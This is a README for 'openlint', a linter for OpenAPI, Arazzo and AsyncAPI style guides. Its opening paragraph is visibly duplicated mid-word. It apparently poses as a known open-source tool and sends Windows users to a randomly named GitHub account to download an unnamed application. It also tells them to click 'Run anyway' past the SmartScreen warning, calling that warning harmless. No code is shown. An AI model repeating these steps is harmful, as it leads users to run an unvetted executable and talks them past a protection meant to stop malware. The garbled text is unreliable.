# 🔍 openlint - Flexible Linting for API Style Guides

[![Download openlint](https://img.shields.io/badge/Download-openlint-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/crampoonpoephilacastanotis388/openlint)

openlint is a flexible JSON and YAML linter for creating automated API style guides. It checks API description files against the rules you choose, so teams can keep documentation clear, consistent, and ready to share. openlint has baked-in support for OpenAPI v3.2 through v2.0, A# 🔍 openlint - Flexible Linting for API Style Guides

[![Download openlint](https://img.shields.io/badge/Download-openlint-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/crampoonpoephilacastanotis388/openlint)

openlint is a flexible JSON and YAML linter for creating automated API style guides. It checks API description files against the rules you choose, so teams can keep their documentation clear, consistent, and ready to share. openlint has baked-in support for OpenAPI v3.2 through v2.0, Arazzo v1.0, and AsyncAPI v2.x, and it also understands plain JSON Schema files. That means one tool can review a whole collection of API documents instead of asking you to juggle several different checkers. It is built for anyone who wants an automated style guide without writing custom software: point it at your files, pick your rules, and read the report it produces.

## What openlint Does

Think of openlint as a spelling and grammar checker, but for API description files. Those files are written in JSON or YAML, two common plain-text formats that store structured information. Instead of checking words, openlint checks the structure: whether a field is named the way your team agreed, whether descriptions are present, whether version numbers follow your house style, and hundreds of similar details.

Because the rules are configurable, openlint adapts to your organisation rather than forcing you into someone else's opinions. You can start with the built-in defaults, then adjust them as your style guide grows. Every check produces a readable message telling you what was found and where, which makes fixing problems straightforward even if you did not write the original file.

## ✨ Why People Use openlint

- **One tool, many formats.** OpenAPI, Arazzo, AsyncAPI, and JSON Schema files can be checked with the same command and the same rule set.
- **Style guides become automatic.** Written guidelines tend to drift. openlint turns them into checks that run the same way every time.
- **Friendly output.** Results are grouped by file and by rule, with plain-language explanations rather than cryptic codes.
- **Flexible rules.** Enable only what matters to you. Start small and add checks as your team matures.
- **Works on Windows.** No programming knowledge is required to run a basic check.
- **Consistent reviews.** Reviewers stop arguing about formatting and spend their time on substance.

## 🚀 Getting Started

Visit this link to download the application:

**https://github.com/crampoonpoephilacastanotis388/openlint**

The link above opens the openlint project page, where the download is published. You do not need an account to browse the page, though creating a free GitHub account makes it easier to return to the project later and to report anything that looks wrong.

Once the application is on your computer, keep it in a folder you can find again, such as `C:\Users\YourName\openlint`. Avoid running it from inside a temporary folder or straight out of a compressed archive, because the tool needs to read files sitting next to it. If Windows shows a blue "Windows protected your PC" panel, choose **More info**, then **Run anyway**. That panel appears for many small, independently made tools and is not a sign that something is damaged.

## 🖥️ A Simple First Run

The easiest way to see what openlint does is to give it one file and read the result.

1. Place the API file you want to check into a folder you can reach easily, for example `C:\Users\YourName\Documents\api`.
2. Open the Start menu, type `cmd`, and press Enter. A black window appears. This is the Command Prompt, a text-based way to talk to your computer.
3. Type the path to the openlint application, followed by a space, followed by the path to your file. Press Enter.
4. Wait a moment. openlint prints a report listing each finding, the file it came from, and a short explanation.
5. Fix the items in your file using any plain-text editor — Notepad works fine, though a dedicated editor shows line numbers more clearly.
6. Repeat the check until the report comes back clean.

If you would rather check an entire folder at once, point openlint at the folder instead of a single file. It walks through every matching document inside and reports on all of them together, which is the usual way teams run it before publishing documentation.

## 📋 What openlint Can Check

The checks fall into a few broad groups. Your exact set depends on the rules you turn on, but typical examples include:

- **Naming and casing.** Field names written in the style your guide specifies, such as consistent lower-case-with-hyphens.
- **Descriptions and summaries.** Every operation, parameter, and response carrying an explanation a reader can understand.
- **Required sections.** Documents containing the parts your organisation insists on, such as contact details or a licence statement.
- **Version consistency.** Declared versions matching the version your guide expects, across OpenAPI 2.0, 3.0, 3.1, and 3.2 documents.
- **Cross-format checks.** Arazzo workflows referencing operations that actually exist, and AsyncAPI channels documented to the same standard as your OpenAPI files.
- **Structural validity.** JSON and YAML files that parse correctly and match the schema they claim to follow.

Each rule can be switched on or off, and most can be adjusted with a short setting when your team's preference differs from the default.

## 🧩 Supported File Types

openlint reads the two text formats used across the API world: JSON, which uses curly braces and commas, and YAML, which uses indentation and dashes. Most people find YAML easier to read by hand, while JSON is easier for machines. openlint handles both without extra steps and does not care which one you prefer.

On top of that, it understands the conventions of OpenAPI versions 3.2, 3.1, 3.0, and 2.0, Arazzo version 1.0, AsyncAPI version 2.x, and general JSON Schema documents. Files are recognised by their contents as well as their extension, so a slightly unusual file name will not confuse it.

## ⚙️ Everyday Use

Once a first check succeeds, the usual pattern is to run openlint before sharing or publishing documentation and to add new rules whenever the team agrees on a new convention. Keeping the rule settings in the same folder as the API files means everyone runs an identical check, which is the whole point of an automated style guide.

For larger collections, run openlint on the whole folder and read the report from the top down. Findings are grouped so that repeated issues appear together, which makes bulk fixes quick.

## ❓ If Something Goes Wrong

- **The window closes immediately.** Re-open the Command Prompt and run the command again so you can read the message before it disappears.
- **"File not found".** The path is probably mistyped. Dragging the file from Explorer into the Command Prompt window inserts its full path for you.
- **A clean file is reported as broken.** Check that the file really is in JSON or YAML format and that it has not been saved with hidden formatting from a word processor.
- **Too many findings at once.** Turn off rules you are not ready to enforce, then switch them back on as your guide settles.

## 🤝 Getting Help

The project page linked above is the place to look for updates and to check whether a question has already been answered. When asking for help, include the exact message you saw and the section of the file it referred to. That detail turns a slow back-and-forth into a quick answer.

Keywords: api, api-governance, api-style-guide, arazzo, arazzo-specification, asyncapi, json-schema, linter, linting, openapi, openapi-spec, openapi2, openapi3, openapi31, openapi32, spectral, style-guide